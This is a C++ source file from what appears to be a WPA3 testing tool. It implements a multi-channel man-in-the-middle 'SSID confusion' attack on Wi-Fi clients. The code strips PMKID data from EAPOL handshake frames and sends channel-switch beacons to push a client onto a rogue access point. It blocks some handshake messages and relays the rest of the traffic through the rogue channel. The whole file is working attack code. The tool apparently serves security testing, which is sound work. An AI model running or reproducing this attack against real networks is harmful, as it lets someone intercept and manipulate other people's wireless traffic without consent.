#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;
using namespace std::chrono;

//TODO test
// Strip PMKID KDE (DD 14 00 0F AC 04 + 16B) from EAPOL-Key msg1 key data.
// Msg1 has no MIC, so key data is unprotected plaintext — no key material needed.
static bool strip_pmkid_kde(frame_raw_t &raw) {
    static constexpr uint8_t snap_eapol[] = {0x88, 0x8e};
	const auto snap = ranges::search(raw, snap_eapol).begin();
    if(snap == raw.end()) return false;
    const size_t eapol_off = (snap - raw.begin()) + 2;
    if(eapol_off + 99 > raw.size()) return false;

    const size_t kdlen_off = eapol_off + 97;
    uint16_t kdlen = (static_cast<uint16_t>(raw[kdlen_off]) << 8) | raw[kdlen_off + 1];
    if(kdlen < 22 || eapol_off + 99 + kdlen > raw.size()) return false;

    static constexpr uint8_t pmkid_kde[] = {0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04};
    const auto kde_start = raw.begin() + static_cast<ptrdiff_t>(eapol_off + 99);
    const auto kde_end   = kde_start + kdlen;
	const auto kde = std::search(kde_start, kde_end, std::begin(pmkid_kde), std::end(pmkid_kde));
    if(kde == kde_end) return false;

    raw.erase(kde, kde + 22);
    kdlen -= 22;
    raw[kdlen_off]     = static_cast<uint8_t>(kdlen >> 8);
    raw[kdlen_off + 1] = static_cast<uint8_t>(kdlen);

    const size_t pktlen_off = eapol_off + 2;
    uint16_t pktlen = (static_cast<uint16_t>(raw[pktlen_off]) << 8) | raw[pktlen_off + 1];
    pktlen -= 22;
    raw[pktlen_off]     = static_cast<uint8_t>(pktlen >> 8);
    raw[pktlen_off + 1] = static_cast<uint8_t>(pktlen);
    return true;
}

void SsidConfusion::send_to_rogue(PDU &pdu) const {
	const std::vector<uint8_t> raw = pdu.serialize();
	send_to_rogue(raw);
}

void SsidConfusion::send_to_rogue(const frame_raw_t &raw) const {
	const auto translated = ensure_radiotap(raw);
	//translate_data_mac(translated, ap->get(SK::mac), rogue_ap->get(SK::mac));
	sock_rogue->send(translated, netconfig.rogue_channel);
}

FrameProcess SsidConfusion::handle_eapol_real(
	const HWAddress<6> addr2, const PDU &pdu,
	const frame_raw_t &raw) const {
	// EAPOL AP -> STA on real channel
	if(addr2 == ap.get(SK::mac) && is_eapol(pdu)) {
		//TODO check first M1as PMKSA cache hit -> force EAP restart
		const int msg = get_eapol_msg_num(pdu);
		if(msg == 2 || msg == 4) return STOP; //block cycles
		if(msg == 1) {
			frame_raw_t stripped = raw;
			strip_pmkid_kde(stripped); //TODO add to mc_mitm as well (force delete PKMSA)
			display_traffic(pdu, "Real channel", " [EAPOL 1/4, PMKID stripped] -- MitM'ing");
			send_to_rogue(stripped);
			return STOP;
		}
		if(msg != -1) return CONTINUE;
		display_traffic(pdu, "Real channel", " AP -> STA  -- MitM'ing ");
		send_to_rogue(raw);
		return STOP;
	}
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) {
	if(dot11.find_pdu<Dot11ProbeRequest>() || dot11.find_pdu<Dot11ProbeResponse>()){
		if(addr2 == sta.get(SK::mac)){
			display_traffic(dot11, "Real channel", " -- send CSA");
			send_csa_beacon();
			client_state.update_state(ClientState::Sent_to_rogue);
		}
		return STOP;
	}
	return CONTINUE;
}

void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;
	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.real_channel))
			return;
	}
	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
		log(LogLevel::DEBUG, "Real channel: Unknown frame type");
		return;
	}

	power_mgmt_response_real(addr2, *dot11);


	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
	SOLVE_OR_CONTINUE(handle_eapol_real(addr2, *pdu, raw))
	SOLVE_OR_CONTINUE(handle_auth_from_client_real(addr1, *dot11))

	#undef SOLVE_OR_CONTINUE

	if(dot11->find_pdu<Dot11Beacon>()) {
		return; // don't relay real AP beacons
	}

	// don't relay real AP auth/assoc responses - client already got our local replies
	if(dot11->find_pdu<Dot11AssocResponse>() || dot11->find_pdu<Dot11ReAssocResponse>()
	   || dot11->find_pdu<Dot11Authentication>()) return;

	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) return;

	if(addr1 == sta.get(SK::mac) || addr2 == ap.get(SK::mac)) {
		// implicitly forward rest of frames STA -> AP
		display_traffic(*pdu, "Real channel", " -- MitM'ing");
		send_to_rogue(raw);
	}
}

}